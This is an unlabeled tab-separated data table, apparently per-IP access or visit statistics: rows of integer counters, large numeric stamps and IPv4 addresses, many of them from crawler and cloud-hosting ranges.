5	1	1	0	1	25994459	0	26064110	25994459	0	26064110	7711	54.36.148.212
5	0	0	0	2	0	0	26044972	0	0	25966767	0	54.36.148.211
5	2	1	0	0	25709498	0	0	25706084	0	0	13685	54.36.148.198
5	2	2	0	1	25713342	0	25950832	25710092	0	25950832	14493	54.36.148.197
5	1	1	0	0	25868745	0	0	25868745	0	0	7711	18.236.254.197
5	1	1	0	0	25857058	0	0	25857058	0	0	7711	34.222.223.37
5	1	1	0	0	25709257	0	0	25709257	0	0	7711	54.36.148.205
5	1	0	0	0	25715698	0	0	25715698	0	0	6903	54.36.148.195
5	1	1	0	0	25968421	0	0	25968421	0	0	7711	54.36.148.204
5	1	1	0	0	25956328	0	0	25956328	0	0	7711	54.36.148.194
5	0	0	0	1	0	0	26027018	0	0	26027018	0	54.36.148.193
5	0	0	0	1	0	0	25571998	0	0	25571998	0	191.119.204.53
5	1	1	0	0	25955149	0	0	25955149	0	0	8034	54.36.148.203
5	2	1	0	1	25959722	0	26024104	25712840	0	26024104	14937	54.36.148.191
5	1	1	0	0	25716168	0	0	25716168	0	0	6782	54.36.148.190
5	1	1	0	0	25956167	0	0	25956167	0	0	8034	54.36.148.200
5	1	1	0	0	25710825	0	0	25710825	0	0	8034	54.36.148.187
5	0	0	0	1	0	0	25992992	0	0	25992992	0	190.161.197.121
5	2	2	0	1	25946667	0	25966102	25712086	0	25966102	15422	54.36.148.186
5	0	0	0	1	0	0	25567897	0	0	25567897	0	142.93.65.167
5	0	0	0	1	0	0	25515913	0	0	25515913	0	191.116.0.98
5	1	1	0	0	25932332	0	0	25932332	0	0	7711	54.36.148.184
5	1	1	0	0	25746556	0	0	25746556	0	0	7221	54.36.148.183
5	1	0	0	0	25959001	0	0	25959001	0	0	6915	54.36.148.179
5	1	1	0	0	25299606	0	0	25299606	0	0	7751	159.65.47.110
5	1	1	0	0	25988210	0	0	25988210	0	0	7711	54.187.185.214
5	0	0	0	2	0	0	26054499	0	0	26011080	0	54.36.148.176
5	1	1	0	0	25805879	0	0	25805879	0	0	7711	54.203.225.131
5	1	1	0	0	25433486	0	0	25433486	0	0	7751	138.197.79.78
5	1	0	0	0	25713328	0	0	25713328	0	0	6903	54.36.148.175
5	2	2	0	1	25971465	0	25991000	25714696	0	25991000	15745	54.36.148.173
5	0	0	0	1	0	0	25956940	0	0	25956940	0	54.36.148.172
5	0	0	0	1	0	0	25765376	0	0	25765376	0	191.119.20.171
5	0	0	0	2	0	0	26056755	0	0	26029473	0	54.36.148.170
5	1	1	0	0	25947727	0	0	25947727	0	0	8034	54.36.148.169
5	0	0	0	1	0	0	24931854	0	0	24931854	0	45.55.244.177
5	1	0	0	0	25926223	0	0	25926223	0	0	26	54.36.148.163
5	1	1	0	0	25978573	0	0	25978573	0	0	7711	54.36.148.162
5	1	1	0	0	25705841	0	0	25705841	0	0	7711	54.36.148.160
5	2	2	0	0	25950995	0	0	25736447	0	0	14932	54.36.148.158
5	1	1	0	1	26019515	0	25926005	26019515	0	25926005	7227	54.36.148.157
5	0	0	0	1	0	0	25932140	0	0	25932140	0	54.36.148.156
5	0	0	0	1	0	0	25978573	0	0	25978573	0	54.36.148.155
5	1	1	0	0	24913707	0	0	24913707	0	0	7751	104.236.109.195
5	1	1	0	0	25809703	0	0	25809703	0	0	7711	54.218.107.246
5	6	6	0	0	25032215	0	0	25030785	0	0	0	200.7.6.18
5	1	1	0	0	25519996	0	0	25519996	0	0	7751	159.65.42.124
5	1	1	0	0	25716725	0	0	25716725	0	0	6782	54.36.148.150
5	5	0	0	1	25559473	0	25559472	25559472	0	25559472	0	190.101.109.204
5	1	1	0	0	25955081	0	0	25955081	0	0	7711	54.36.148.148
5	2	0	0	0	25709205	0	0	25707801	0	0	13806	54.36.148.147
5	1	1	0	0	25851675	0	0	25851675	0	0	7711	185.249.197.229
5	2	2	0	0	26063854	0	0	25958849	0	0	14493	54.36.148.146
5	1	1	0	1	25709651	0	26000097	25709651	0	26000097	7221	54.36.148.143
5	1	1	0	0	26068874	0	0	26068874	0	0	7711	35.167.71.214
5	1	1	0	0	25954158	0	0	25954158	0	0	7711	68.183.51.58
5	1	1	0	1	25984264	0	25970432	25984264	0	25970432	7711	54.36.148.141
5	0	0	0	1	0	0	25968579	0	0	25968579	0	54.36.148.137
5	1	1	0	0	25954401	0	0	25954401	0	0	7711	54.36.148.136
5	0	0	0	1	0	0	25982823	0	0	25982823	0	54.36.148.135
5	0	0	0	1	0	0	26073684	0	0	26073684	0	54.36.148.134
5	1	1	0	0	25708303	0	0	25708303	0	0	8034	54.36.148.133
5	1	1	0	0	26044381	0	0	26044381	0	0	7711	54.149.211.110
5	2	2	0	1	25956940	0	26017612	25715714	0	26017612	14493	54.36.148.130
5	1	0	0	0	25716719	0	0	25716719	0	0	6903	54.36.148.127
5	0	0	0	2	0	0	26062929	0	0	25984264	0	54.36.148.124
5	1	1	0	0	25920397	0	0	25920397	0	0	0	54.67.99.14
5	1	1	0	0	26070015	0	0	26070015	0	0	8034	54.36.148.122
5	1	1	0	1	25708362	0	25944116	25708362	0	25944116	7711	54.36.148.120
5	0	0	0	1	0	0	25932332	0	0	25932332	0	54.36.148.117
5	0	0	0	1	0	0	26062462	0	0	26062462	0	54.36.148.116
5	1	1	0	0	25880188	0	0	25880188	0	0	7711	52.36.24.197
5	0	0	0	1	0	0	25971465	0	0	25971465	0	54.36.148.115
5	1	1	0	0	25712255	0	0	25712255	0	0	7711	54.36.148.112
5	1	1	0	1	25714009	0	26005173	25714009	0	26005173	7711	54.36.148.110
5	2	1	0	1	26012702	0	25956113	25967834	0	25956113	14626	54.36.148.108
5	1	1	0	0	26008225	0	0	26008225	0	0	6782	54.36.148.107
5	1	1	0	0	26011080	0	0	26011080	0	0	7711	54.36.148.106
5	0	0	0	1	0	0	25998207	0	0	25998207	0	138.197.70.162
5	0	0	0	1	0	0	25179038	0	0	25179038	0	138.197.64.212
5	1	1	0	0	25956113	0	0	25956113	0	0	7711	54.36.148.103
5	1	1	0	0	25999277	0	0	25999277	0	0	0	185.129.62.62
5	4	4	0	0	25195073	0	0	25178897	0	0	31004	54.67.67.222
5	1	1	0	0	24933055	0	0	24933055	0	0	7751	45.55.226.20
5	1	1	0	0	25782250	0	0	25782250	0	0	7711	34.220.184.236
5	0	0	0	1	0	0	25344767	0	0	25344767	0	159.65.178.52
5	0	0	0	1	0	0	25737496	0	0	25737496	0	65.19.167.130
5	51	51	0	39	26088776	0	26081684	25765574	0	25768469	554239	60.191.38.77
5	1	1	0	0	25982422	0	0	25982422	0	0	7711	54.184.64.72
5	108	108	0	106	25979182	0	25977196	25444463	0	25444514	0	138.246.253.5
5	1	1	0	0	25609252	0	0	25609252	0	0	7711	159.65.175.139
5	0	0	0	1	0	0	25580903	0	0	25580903	0	191.119.123.194
5	1	1	0	0	25990901	0	0	25990901	0	0	7711	54.203.17.83
5	1	1	0	0	25864362	0	0	25864362	0	0	7711	54.188.147.133
5	1	1	0	0	26073176	0	0	26073176	0	0	7711	18.237.195.187
5	1	1	0	0	25847101	0	0	25847101	0	0	7711	54.190.167.37
5	1	1	0	0	25818317	0	0	25818317	0	0	7711	34.222.125.148
5	0	0	0	1	0	0	25642628	0	0	25642628	0	191.116.171.100
5	1	0	0	3	25239687	0	25239687	25239687	0	25239687	0	40.77.23.254
5	0	0	0	1	0	0	25615218	0	0	25615218	0	191.116.224.236
5	2	2	0	2	26080239	0	25966447	25916029	0	25742384	15422	209.17.96.66
5	1	1	0	0	26083494	0	0	26083494	0	0	7711	34.220.228.95
5	0	0	0	1	0	0	25520176	0	0	25520176	0	191.116.32.190
5	1	1	0	0	24877259	0	0	24877259	0	0	7751	45.55.222.231
5	1	1	0	0	25884260	0	0	25884260	0	0	7711	209.17.96.58
5	1	1	0	0	26008488	0	0	26008488	0	0	7711	54.203.193.163
5	1	1	0	0	25836974	0	0	25836974	0	0	7711	54.191.85.174
5	4	4	0	1	26065613	0	25893433	25798026	0	25893433	30844	209.17.96.50
5	1	1	0	0	25179039	0	0	25179039	0	0	7751	174.138.56.235
5	1	1	0	0	24954380	0	0	24954380	0	0	7751	174.138.56.234
5	0	0	0	1	0	0	25215201	0	0	25215201	0	104.236.56.0
5	1	1	0	0	26088033	0	0	26088033	0	0	7711	38.145.108.156
5	3	3	0	1	26010693	0	25738515	25925618	0	25738515	55331	209.17.96.42
5	3	3	0	0	26090032	0	0	25833359	0	0	23133	209.17.96.34
5	1	1	0	0	25835532	0	0	25835532	0	0	7711	34.216.2.108
5	3	3	0	2	25955803	0	25848624	25866322	0	25732744	23133	209.17.96.26
5	0	0	0	14	0	0	26028697	0	0	25733858	0	186.21.193.52
5	1	1	0	0	24876494	0	0	24876494	0	0	7751	104.131.46.44
5	0	0	0	1	0	0	25781174	0	0	25781174	0	45.55.48.75
5	3	3	0	2	25928978	0	25849094	25838708	0	25809073	23133	209.17.96.18
5	1	1	0	0	25916230	0	0	25916230	0	0	7711	52.24.186.173
5	0	0	0	2	0	0	25626977	0	0	25626918	0	191.116.159.122
5	1	1	0	0	25907449	0	0	25907449	0	0	7711	45.55.47.125
5	2	2	0	0	26086314	0	0	25966436	0	0	15422	209.17.96.10
5	1	1	0	0	25652154	0	0	25652154	0	0	7711	165.227.79.190
5	1	1	0	0	25805191	0	0	25805191	0	0	7711	34.222.244.179
5	0	0	0	1	0	0	25855714	0	0	25855714	0	66.249.73.3
5	0	0	0	3	0	0	25911806	0	0	25855714	0	66.249.73.1
5	0	0	0	2	0	0	25523275	0	0	25523129	0	191.116.154.151
5	1	1	0	0	25867276	0	0	25867276	0	0	7711	34.220.228.31
5	12	4	0	9	26031608	0	26031608	26031607	0	26031607	479484	23.92.127.50
5	1	1	0	0	26031421	0	0	26031421	0	0	7711	54.191.219.33
5	1	1	0	0	26085785	0	0	26085785	0	0	7711	167.71.99.230
5	1	1	0	0	25962282	0	0	25962282	0	0	7711	18.237.25.252
5	0	0	0	1	0	0	25645784	0	0	25645784	0	191.116.61.21
5	1	1	0	0	25781150	0	0	25781150	0	0	7711	159.203.108.60
5	1	1	0	0	25866098	0	0	25866098	0	0	7711	54.187.157.199
5	1	1	0	0	25939216	0	0	25939216	0	0	7711	34.219.178.139
5	1	1	0	0	25772221	0	0	25772221	0	0	7711	18.237.178.214
5	1	1	0	0	25877495	0	0	25877495	0	0	7711	54.201.251.221
5	0	0	0	1	0	0	25609258	0	0	25609258	0	159.65.160.34
5	0	0	0	1	0	0	25605412	0	0	25605412	0	191.119.177.122
5	0	0	0	2	0	0	25500696	0	0	25467472	0	201.214.140.142
5	1	1	0	0	25200457	0	0	25200457	0	0	7751	13.56.159.157
5	0	0	0	2	0	0	25491663	0	0	25491403	0	191.116.137.236
5	1	1	0	0	25932020	0	0	25932020	0	0	7711	34.220.63.40
5	1	1	0	0	25976679	0	0	25976679	0	0	7711	54.191.80.59
5	1	1	0	0	26026943	0	0	26026943	0	0	7711	54.186.130.157
5	1	1	0	0	26037432	0	0	26037432	0	0	7711	165.227.110.93
5	1	1	0	0	25863784	0	0	25863784	0	0	7711	159.203.124.51
5	0	0	0	2	0	0	25583639	0	0	25583587	0	191.119.4.12
5	1	1	0	0	26087200	0	0	26087200	0	0	7711	181.214.183.232
5	0	0	0	1	0	0	25863758	0	0	25863758	0	68.183.147.231
5	1	1	0	0	25998201	0	0	25998201	0	0	7711	159.203.118.139
5	0	0	0	1	0	0	25954061	0	0	25954061	0	142.93.188.44
5	0	0	0	2	0	0	25495881	0	0	25495676	0	191.116.92.33
5	1	1	0	0	25888900	0	0	25888900	0	0	7711	54.185.58.169
5	0	0	0	1	0	0	25652181	0	0	25652181	0	142.93.188.158
5	0	0	0	6	0	0	25958835	0	0	25958761	0	201.239.9.252
5	0	0	0	2	0	0	25535096	0	0	25534907	0	191.119.68.12
5	1	1	0	0	25943558	0	0	25943558	0	0	7711	35.164.254.183
5	0	0	0	1	0	0	25215212	0	0	25215212	0	138.197.96.211
5	1	1	0	0	25875932	0	0	25875932	0	0	7711	34.222.227.187
5	2	2	0	0	25759222	0	0	25759222	0	0	15422	34.221.130.168
5	1	1	0	0	26025626	0	0	26025626	0	0	7711	54.213.115.216
5	1	1	0	0	26038641	0	0	26038641	0	0	7711	138.197.96.191
5	0	0	0	1	0	0	25741959	0	0	25741959	0	159.89.180.50
5	2	2	0	0	25160024	0	0	25145383	0	0	15502	54.219.178.100
5	1	1	0	0	25770836	0	0	25770836	0	0	7711	34.210.141.244
5	1	1	0	0	25950788	0	0	25950788	0	0	7711	34.218.75.254
5	0	0	0	2	0	0	25482914	0	0	25482723	0	191.116.245.28
5	0	0	0	4	0	0	25613262	0	0	25072455	0	66.249.65.95
5	0	0	0	2	0	0	25611344	0	0	25610884	0	191.116.119.63
5	0	0	0	1	0	0	25554756	0	0	25554756	0	191.119.30.240
5	1	1	0	0	26045780	0	0	26045780	0	0	7711	52.11.131.158
5	1	1	0	0	26047545	0	0	26047545	0	0	7711	34.221.221.20
5	0	0	0	1	0	0	25563364	0	0	25563364	0	191.119.8.135
5	1	1	0	0	25756312	0	0	25756312	0	0	7711	52.36.237.90
5	0	0	0	3	0	0	25072480	0	0	25072455	0	66.249.65.66
5	1	1	0	0	26062953	0	0	26062953	0	0	7711	54.200.71.150
5	0	0	0	5	0	0	25613262	0	0	25378126	0	66.249.65.64
5	1	1	0	0	25838428	0	0	25838428	0	0	7711	52.12.164.104
5	0	0	0	1	0	0	24952013	0	0	24952013	0	66.249.65.52
5	0	0	0	7	0	0	24974245	0	0	24952013	0	66.249.65.50
5	0	0	0	1	0	0	25562344	0	0	25562344	0	191.119.41.108
5	1	1	0	0	25259711	0	0	25259711	0	0	7751	45.55.160.78
5	1	1	0	0	25829788	0	0	25829788	0	0	7711	54.186.118.106
5	0	0	0	1	0	0	25130230	0	0	25130230	0	104.236.201.148
5	1	1	0	0	25982709	0	0	25982709	0	0	7711	212.180.208.122
5	1	1	0	0	26079043	0	0	26079043	0	0	7711	34.220.75.84
5	0	0	0	4	0	0	24872318	0	0	24872287	0	66.249.65.23
5	1	1	0	0	25710267	0	0	25710267	0	0	7221	54.36.149.99
5	0	0	0	2	0	0	25782393	0	0	25782298	0	191.119.35.130
5	1	1	0	0	25713120	0	0	25713120	0	0	7711	54.36.149.98
5	0	0	0	1	0	0	26059564	0	0	26059564	0	54.36.149.97
5	1	0	0	0	25738651	0	0	25738651	0	0	6903	54.36.149.95
5	1	1	0	0	25709182	0	0	25709182	0	0	8034	54.36.149.94
5	1	1	0	0	25992247	0	0	25992247	0	0	7711	54.36.149.93
5	0	0	0	1	0	0	25953286	0	0	25953286	0	54.36.149.92
5	0	0	0	1	0	0	25981830	0	0	25981830	0	54.36.149.91
5	2	1	0	1	25716849	0	25992247	25708757	0	25992247	14614	54.36.149.89
5	1	1	0	0	25747453	0	0	25747453	0	0	8034	54.36.149.87
5	1	1	0	0	25944116	0	0	25944116	0	0	7711	54.36.149.85
5	1	1	0	1	25954806	0	25959722	25954806	0	25959722	6782	54.36.149.84
5	1	1	0	0	25988367	0	0	25988367	0	0	7711	54.36.150.83
5	1	1	0	1	26020441	0	26069381	26020441	0	26069381	7711	54.36.149.83
5	1	1	0	0	26070129	0	0	26070129	0	0	7227	54.36.150.82
5	1	1	0	0	26064110	0	0	26064110	0	0	8034	54.36.150.81
5	1	1	0	0	26054096	0	0	26054096	0	0	6782	54.36.150.79
5	1	1	0	0	26075962	0	0	26075962	0	0	7711	34.211.163.181
5	0	0	0	1	0	0	25566238	0	0	25566238	0	191.119.18.239
5	1	1	0	0	25715645	0	0	25715645	0	0	7711	54.36.149.76
5	1	1	0	0	25975215	0	0	25975215	0	0	7711	54.212.72.132
5	1	1	0	0	25946279	0	0	25946279	0	0	6782	54.36.149.74
5	1	1	0	0	24931890	0	0	24931890	0	0	7751	174.138.63.89
5	1	1	0	0	26012025	0	0	26012025	0	0	8034	54.36.150.73
5	1	1	0	0	25932140	0	0	25932140	0	0	7711	54.36.149.72
5	1	1	0	0	25884613	0	0	25884613	0	0	7711	52.24.117.45
5	0	0	0	1	0	0	25987318	0	0	25987318	0	54.36.149.70
5	1	1	0	0	25708996	0	0	25708996	0	0	7221	54.36.149.68
5	1	1	0	0	25991000	0	0	25991000	0	0	7711	54.36.150.67
5	1	1	0	0	25695084	0	0	25695084	0	0	7711	165.227.126.156
5	1	1	0	0	25886120	0	0	25886120	0	0	7711	52.42.49.171
5	2	2	0	0	26071080	0	0	26002302	0	0	15745	54.36.150.65
5	1	1	0	0	25652209	0	0	25652209	0	0	7711	167.99.60.103
5	3	3	0	0	26021107	0	0	25934416	0	0	23133	54.36.150.61
5	1	1	0	0	26058791	0	0	26058791	0	0	7711	34.219.181.27
5	1	1	0	0	25823355	0	0	25823355	0	0	7711	68.183.150.42
5	2	2	0	0	26038052	0	0	25712187	0	0	15745	54.36.149.59
5	1	1	0	0	26084760	0	0	26084760	0	0	7711	35.167.206.124
5	1	1	0	0	24913803	0	0	24913803	0	0	7751	138.197.5.227
5	2	2	0	0	25945878	0	0	25709451	0	0	15422	54.36.149.58
5	1	1	0	0	26018916	0	0	26018916	0	0	7711	54.36.150.58
5	2	1	0	0	25968579	0	0	25711880	0	0	14136	54.36.149.57
5	2	2	0	0	25138674	0	0	25136409	0	0	15502	52.53.231.176
5	0	0	0	1	0	0	26012702	0	0	26012702	0	54.36.149.56
5	1	1	0	0	25707088	0	0	25707088	0	0	7711	54.36.149.55
5	0	0	0	1	0	0	25984489	0	0	25984489	0	54.36.149.53
5	1	1	0	0	26037401	0	0	26037401	0	0	39897	167.71.182.168
5	1	1	0	1	25708256	0	26035012	25708256	0	26035012	7221	54.36.149.52
5	1	1	0	0	26002392	0	0	26002392	0	0	7711	54.36.150.52
5	1	1	0	0	25710378	0	0	25710378	0	0	8034	54.36.149.51
5	1	1	0	0	25713973	0	0	25713973	0	0	8034	151.80.39.9
5	1	1	0	0	26027088	0	0	26027088	0	0	7711	34.220.248.3
5	1	1	0	0	25955094	0	0	25955094	0	0	7711	54.36.149.47
5	1	1	0	0	26035012	0	0	26035012	0	0	7711	54.36.150.47
5	1	1	0	0	25715581	0	0	25715581	0	0	8034	54.36.149.45
5	1	1	0	0	26038657	0	0	26038657	0	0	7711	68.183.149.26
5	1	1	0	0	26054772	0	0	26054772	0	0	7711	54.36.149.44
5	2	2	0	0	25716061	0	0	25712621	0	0	16068	54.36.149.43
5	1	1	0	0	26027018	0	0	26027018	0	0	7711	54.36.150.43
5	1	1	0	0	25714965	0	0	25714965	0	0	7221	54.36.149.42
5	2	2	0	0	26053397	0	0	26000506	0	0	15422	54.36.150.41
5	1	1	0	0	25714449	0	0	25714449	0	0	7711	54.36.149.39
5	1	1	0	0	26005985	0	0	26005985	0	0	7711	54.36.150.40
5	0	0	0	2	0	0	26053397	0	0	25968243	0	54.36.149.38
5	1	1	0	0	26040376	0	0	26040376	0	0	7711	54.187.129.167
5	1	1	0	0	25084185	0	0	25084185	0	0	7751	159.203.136.48
5	1	1	0	0	26030426	0	0	26030426	0	0	7711	54.36.150.37
5	0	0	0	1	0	0	25955081	0	0	25955081	0	54.36.149.35
5	1	1	0	0	26001452	0	0	26001452	0	0	7711	54.36.150.35
5	1	1	0	0	25926951	0	0	25926951	0	0	7711	54.36.150.34
5	2	2	0	0	25980539	0	0	25710724	0	0	14493	54.36.149.33
5	0	0	0	1	0	0	25781113	0	0	25781113	0	138.197.104.190
5	1	1	0	0	25815434	0	0	25815434	0	0	7711	54.245.39.93
5	1	1	0	0	25711376	0	0	25711376	0	0	8034	54.36.149.28
5	0	0	0	1	0	0	25954047	0	0	25954047	0	54.36.149.27
5	1	1	0	0	26027932	0	0	26027932	0	0	7711	54.36.150.26
5	1	1	0	0	26029473	0	0	26029473	0	0	7711	54.36.150.23
5	1	1	0	0	25958252	0	0	25958252	0	0	7711	34.209.189.169
5	1	1	0	0	25716137	0	0	25716137	0	0	7711	54.36.149.21
5	1	1	0	0	26073684	0	0	26073684	0	0	7711	54.36.150.19
5	2	1	0	0	25711899	0	0	25710387	0	0	13685	54.36.149.19
5	1	1	0	0	26002598	0	0	26002598	0	0	7711	52.26.35.47
5	0	0	0	1	0	0	26009744	0	0	26009744	0	54.36.149.20
5	1	1	0	0	25707828	0	0	25707828	0	0	7221	54.36.149.18
5	0	0	0	1	0	0	25950735	0	0	25950735	0	54.36.149.17
5	2	0	0	0	25984066	0	0	25983382	0	0	2140	62.210.202.81
5	1	1	0	1	26074380	0	25986670	26074380	0	25986670	7711	54.36.149.16
5	1	0	0	2	25712412	0	26082118	25712412	0	25925923	6903	54.36.149.15
5	1	1	0	0	25891761	0	0	25891761	0	0	7711	18.237.216.71
5	0	0	0	2	0	0	26021107	0	0	25958849	0	54.36.149.14
5	1	1	0	0	26059564	0	0	26059564	0	0	7711	54.36.150.12
5	1	0	0	0	25959775	0	0	25959775	0	0	6915	54.36.149.12
5	1	1	0	0	25981830	0	0	25981830	0	0	7711	54.36.149.11
5	1	1	0	0	26085745	0	0	26085745	0	0	7711	167.99.124.153
5	0	0	0	2	0	0	25817194	0	0	25816822	0	191.119.127.245
5	1	1	0	0	25823312	0	0	25823312	0	0	7711	209.97.154.95
5	1	1	0	0	25433484	0	0	25433484	0	0	7751	159.65.180.169
5	1	1	0	0	25823339	0	0	25823339	0	0	7711	138.197.79.113
5	0	0	0	1	0	0	25907448	0	0	25907448	0	159.65.179.159
5	0	0	0	2	0	0	25520626	0	0	25520371	0	191.116.110.163
5	1	1	0	0	25963996	0	0	25963996	0	0	7711	34.220.128.216
5	1	1	0	0	25907393	0	0	25907393	0	0	7711	68.183.56.81
5	1	1	0	0	25741995	0	0	25741995	0	0	7711	159.65.244.198
5	0	0	0	1	0	0	25603685	0	0	25603685	0	191.116.69.56
5	1	1	0	0	25609264	0	0	25609264	0	0	7711	159.65.168.81
5	1	0	0	3	25308760	0	25308760	25308760	0	25308760	0	13.84.231.75
5	1	1	0	0	25344762	0	0	25344762	0	0	7751	159.203.167.51
5	1	1	0	0	25842736	0	0	25842736	0	0	7711	52.26.131.6
5	0	0	0	1	0	0	25520034	0	0	25520034	0	159.65.244.67
5	1	1	0	0	26038757	0	0	26038757	0	0	7711	159.89.191.167
5	1	1	0	0	24876300	0	0	24876300	0	0	7751	138.197.70.12
5	1	1	0	0	25927745	0	0	25927745	0	0	7711	54.187.151.83
5	1	1	0	0	25848457	0	0	25848457	0	0	7711	52.40.161.14
5	0	0	0	1	0	0	25614196	0	0	25614196	0	191.116.96.216
5	1	1	0	0	25858891	0	0	25858891	0	0	0	54.153.94.40
5	1	1	0	0	26090399	0	0	26090399	0	0	7711	181.215.50.38
5	0	0	0	4	0	0	25631469	0	0	25631321	0	191.116.238.96
5	0	0	0	1	0	0	25299603	0	0	25299603	0	159.89.180.238
5	1	1	0	0	25792282	0	0	25792282	0	0	7711	35.160.235.119
5	1	1	0	0	24994423	0	0	24994423	0	0	7751	159.203.117.60
5	1	1	0	0	25841297	0	0	25841297	0	0	7711	35.167.238.217
5	1	1	0	0	26089081	0	0	26089081	0	0	7711	45.82.49.137
5	0	0	0	1	0	0	25616874	0	0	25616874	0	191.116.104.146
5	1	1	0	0	25921872	0	0	25921872	0	0	7711	34.219.253.29
5	1	1	0	0	25179069	0	0	25179069	0	0	7751	165.227.103.74
5	1	1	0	0	25861703	0	0	25861703	0	0	7711	54.202.71.225
5	1	1	0	0	25956665	0	0	25956665	0	0	0	185.98.12.13
5	1	1	0	0	25812474	0	0	25812474	0	0	7711	54.69.2.123
5	0	0	0	1	0	0	25600807	0	0	25600807	0	191.116.254.98
5	0	0	0	1	0	0	25576694	0	0	25576694	0	191.119.176.229
5	0	0	0	1	0	0	25259808	0	0	25259808	0	45.55.88.76
5	1	1	0	0	25773682	0	0	25773682	0	0	7711	54.202.96.92
5	1	1	0	0	25710513	0	0	25710513	0	0	7711	5.196.87.9
5	1	1	0	0	25715141	0	0	25715141	0	0	8034	5.196.87.3
5	0	0	0	3	0	0	25884429	0	0	25873845	0	66.249.66.222
5	1	1	0	0	26070306	0	0	26070306	0	0	7711	52.38.56.152
5	0	0	0	12	0	0	25832336	0	0	25558669	0	66.249.66.198
5	0	0	0	15	0	0	25873845	0	0	25557059	0	66.249.66.196
5	0	0	0	5	0	0	25884429	0	0	25849043	0	66.249.66.193
5	1	1	0	0	25944930	0	0	25944930	0	0	7711	35.167.3.65
5	0	0	0	7	0	0	25829393	0	0	25569523	0	66.249.66.200
5	1	1	0	0	25775014	0	0	25775014	0	0	7711	18.237.46.101
5	0	0	0	1	0	0	25592484	0	0	25592484	0	191.116.96.102
5	0	0	0	1	0	0	25609243	0	0	25609243	0	159.65.32.95
5	0	0	0	2	0	0	24925160	0	0	24925142	0	66.249.66.175
5	1	1	0	0	26055738	0	0	26055738	0	0	7711	34.219.37.50
5	0	0	0	1	0	0	24925142	0	0	24925142	0	66.249.66.172
5	0	0	0	1	0	0	24925158	0	0	24925158	0	66.249.66.169
5	1	1	0	0	25855865	0	0	25855865	0	0	7711	34.222.118.106
5	1	1	0	0	26028655	0	0	26028655	0	0	7711	34.208.235.28
5	0	0	0	8	0	0	26080789	0	0	25907971	0	66.249.66.154
5	0	0	0	2	0	0	25471203	0	0	25471203	0	191.116.19.202
5	0	0	0	1	0	0	25433509	0	0	25433509	0	104.236.253.5
5	0	0	0	15	0	0	26061080	0	0	24930475	0	66.249.66.152
5	0	0	0	13	0	0	26080789	0	0	24935756	0	66.249.66.150
5	0	0	0	11	0	0	25136804	0	0	24930462	0	66.249.66.148
5	1	1	0	0	25933470	0	0	25933470	0	0	7711	34.222.107.166
5	1	1	0	0	25858650	0	0	25858650	0	0	7711	34.217.53.26
5	1	1	0	0	24954396	0	0	24954396	0	0	7751	174.138.50.190
5	2	0	0	6	25808243	0	25808243	25558380	0	25558380	0	52.125.132.1
5	1	1	0	0	25762104	0	0	25762104	0	0	7711	54.184.214.107
5	1	0	0	3	25906512	0	25906512	25906512	0	25906512	0	52.125.132.0
5	1	1	0	0	25998191	0	0	25998191	0	0	7711	134.209.47.119
5	1	1	0	0	25215209	0	0	25215209	0	0	7751	45.55.228.62
5	1	1	0	0	25887693	0	0	25887693	0	0	7711	34.217.44.159
5	0	0	0	1	0	0	25494776	0	0	25494776	0	191.116.16.68
5	1	1	0	0	25766638	0	0	25766638	0	0	7711	18.237.24.214
5	1	1	0	0	24914655	0	0	24914655	0	0	7751	45.55.209.188
5	0	0	0	1	0	0	25741952	0	0	25741952	0	209.97.151.22
5	1	1	0	0	26077646	0	0	26077646	0	0	7711	18.237.183.130
5	0	0	0	1	0	0	26085765	0	0	26085765	0	167.99.119.78
5	1	1	0	0	25979532	0	0	25979532	0	0	7711	18.237.106.248
5	1	1	0	0	25942306	0	0	25942306	0	0	7711	34.219.28.101
5	1	1	0	0	25706130	0	0	25706130	0	0	8034	151.80.39.182
5	2	2	0	0	25712306	0	0	25708956	0	0	14003	151.80.39.177
5	0	0	0	1	0	0	25475700	0	0	25475700	0	191.116.80.151
5	1	0	0	3	24990921	0	24990921	24990921	0	24990921	0	13.67.219.29
5	0	0	0	1	0	0	25736520	0	0	25736520	0	162.247.74.204
5	1	1	0	0	26051547	0	0	26051547	0	0	7711	54.245.180.69
5	0	0	0	1	0	0	25564801	0	0	25564801	0	191.119.32.9
5	2	1	0	0	25714417	0	0	25709924	0	0	13685	151.80.39.169
5	2	2	0	0	25738374	0	0	25706242	0	0	14493	151.80.39.168
5	0	0	0	1	0	0	25299619	0	0	25299619	0	159.65.32.11
5	1	1	0	0	25710775	0	0	25710775	0	0	7711	151.80.39.167
5	1	1	0	0	26041649	0	0	26041649	0	0	7711	34.221.2.71
5	1	1	0	0	26025615	0	0	26025615	0	0	7711	54.202.126.96
5	1	1	0	0	25781106	0	0	25781106	0	0	7711	142.93.182.195
5	2	2	0	0	25713778	0	0	25708722	0	0	14816	151.80.39.159
5	1	1	0	0	26084280	0	0	26084280	0	0	7711	181.214.182.212
5	1	1	0	0	25708899	0	0	25708899	0	0	7711	151.80.39.158
5	1	1	0	0	26087748	0	0	26087748	0	0	7711	52.38.34.195
5	1	1	0	1	26008284	0	25782772	26008284	0	25782772	7711	212.83.146.233
5	1	1	0	0	26060174	0	0	26060174	0	0	7711	34.221.11.66
5	0	0	0	1	0	0	25746556	0	0	25746556	0	151.80.39.151
5	1	1	0	0	25715243	0	0	25715243	0	0	7711	151.80.39.150
5	1	1	0	0	25716129	0	0	25716129	0	0	7711	151.80.39.148
5	1	1	0	0	25705703	0	0	25705703	0	0	8034	151.80.39.147
5	1	1	0	0	25709932	0	0	25709932	0	0	8034	151.80.39.146
5	1	1	0	0	25860093	0	0	25860093	0	0	0	13.52.77.7
5	0	0	0	1	0	0	25935214	0	0	25935214	0	118.27.31.97
5	1	1	0	0	25999924	0	0	25999924	0	0	7711	51.15.192.148
5	0	0	0	1	0	0	24954410	0	0	24954410	0	45.55.139.121
5	0	0	0	1	0	0	25652130	0	0	25652130	0	142.93.176.214
5	1	1	0	0	25741943	0	0	25741943	0	0	7711	104.248.15.133
5	54	54	0	44	25485321	0	25484529	25102627	0	25131649	0	138.246.253.19
5	1	0	0	0	24891477	0	0	24891477	0	0	0	186.9.129.248
5	6	6	0	48	25120760	0	25120760	25119054	0	25119054	0	138.246.253.15
5	1	1	0	0	25807013	0	0	25807013	0	0	7711	34.211.167.240
5	1	1	0	0	25713385	0	0	25713385	0	0	7711	151.80.39.119
5	1	1	0	0	25865892	0	0	25865892	0	0	7711	34.222.51.172
5	1	1	0	0	25706199	0	0	25706199	0	0	7221	151.80.39.117
5	1	1	0	0	25715867	0	0	25715867	0	0	7221	151.80.39.116
5	2	2	0	0	25682076	0	0	25681088	0	0	15422	196.52.43.76
